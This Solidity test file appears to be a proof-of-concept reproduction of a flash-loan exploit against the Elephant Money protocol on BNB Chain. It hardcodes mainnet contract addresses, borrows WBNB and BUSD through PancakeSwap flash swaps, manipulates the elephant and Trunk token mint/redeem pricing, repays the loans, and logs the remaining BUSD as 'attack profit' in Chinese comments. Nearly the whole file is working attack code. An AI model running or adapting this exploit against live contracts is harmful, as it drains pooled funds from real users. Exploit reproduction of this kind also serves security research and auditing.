// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";

interface IpancakePair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    
    function token0() external view returns (address);
    function token1() external view returns (address);
    
}
interface  IWBNB {
    function name() external view returns (string memory);

    function approve(address guy, uint256 wad) external returns (bool);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address src,
        address dst,
        uint256 wad
    ) external returns (bool);

    function withdraw(uint256 wad) external;

    function decimals() external view returns (uint8);

    function balanceOf(address) external view returns (uint256);

    function symbol() external view returns (string memory);

    function transfer(address dst, uint256 wad) external returns (bool);

    function deposit() external payable;

    function allowance(address, address) external view returns (uint256);

    event Approval(address indexed src, address indexed guy, uint256 wad);
    event Transfer(address indexed src, address indexed dst, uint256 wad);
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);
}

interface IERC20Token {
    function totalSupply() external view returns (uint256 supply);
    function transfer(address _to, uint256 _value) external  returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}

interface IRouter {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InotVerified {

    function mint(uint256 value) external;


    function redeem(uint256 value) external;

}

contract ContractTest is DSTest {

    IWBNB  wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    address public  BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    address public  elephant_wbnb_Pair = 0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;

    address public  BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    address[] path_1 =  [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688];

    address[] path_2 =  [0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c];

    address[] path_3 =  [0xdd325C38b12903B727D16961e61333f4871A70E0,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];

    address[] path_4 =  [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];



    IERC20Token busd   = IERC20Token(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IERC20Token elephant  = IERC20Token(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);

    IERC20Token Trunk = IERC20Token(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    InotVerified not_verified  = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);


    constructor() public {
        // 各种授权
        elephant.approve(address(router), type(uint256).max);

        Trunk.approve(address(router), type(uint256).max);

        Trunk.approve(address(not_verified), type(uint256).max);

        busd.approve(address(not_verified),type(uint256).max);

        wbnb.approve(address(router),type(uint256).max);
    }


    function test_1() public {

        // 闪电贷借10万WBNB

        IpancakePair(BUSDT_WBNB_Pair).swap(0,100000 ether, address(this), '0x00');
    }


    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{

        if(msg.sender == BUSDT_WBNB_Pair){

            IpancakePair(BUSD_USDT_Pair).swap(0, 90000000 ether,address(this), '0x00');
        }else{
            attack();
        }

    }

    function attack() public{
        
        // 10万 WBNB 换 10万BNB
        wbnb.withdraw(100000 ether);

        // 10万BNB 换 elephant
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100000 ether}(0, path_1, address(this), block.timestamp);

        // 用9千万busd 铸造 相应数量的 Trunk

        not_verified.mint(90000000 ether);

        // 查询此时Trunk的余额
        uint balance_Trunk = Trunk.balanceOf(address(this));

        emit log_named_uint("The Trunk  after mint:",balance_Trunk);


        // 查询此时elephant的余额
        uint balance_elephant =  elephant.balanceOf(address(this));

        emit log_named_uint("The elephant after swap", balance_elephant);

        // 把全部elephant 换成 wbnb
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(balance_elephant, 0, path_2, address(this), block.timestamp);

        // 查看此时的WBNB余额
        emit log_named_uint("The WBNB Balance Now:", wbnb.balanceOf(address(this)));

        // 把45000的trunk换成busd
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(45000 ether,0,path_3,address(this), block.timestamp);

        // 查看此时的busd余额
        emit log_named_uint("The BUSD swap with Trunk:", busd.balanceOf(address(this)));

        
        balance_Trunk = Trunk.balanceOf(address(this));

        not_verified.redeem(balance_Trunk);


        // 获取redeem之后的elephant余额
        uint b3 =  elephant.balanceOf(address(this));


        emit log_named_uint("The elephant after redeem", b3);

        // 把redeem之后的elephant全部换成wbnb
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path_2, address(this), block.timestamp);

        emit log_named_uint("The WBNB Balance before payback:", wbnb.balanceOf(address(this)));

        // 归还第一笔闪电贷
        wbnb.transfer(BUSDT_WBNB_Pair, 100300 ether);

        // 剩下的WBNB 全部换成BUSD

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wbnb.balanceOf(address(this)), 0, path_4, address(this), block.timestamp);

        emit log_named_uint("The BUSD before pay back:", busd.balanceOf(address(this)));

        // 归还第二笔闪电贷
        busd.transfer(BUSD_USDT_Pair, 90300000 ether);


        // 最后的剩余BUSD就是本次攻击的全部获利
        emit log_named_uint("The BUSD after pay back:", busd.balanceOf(address(this)));

    }

    receive() external payable {
        
    }
    

}
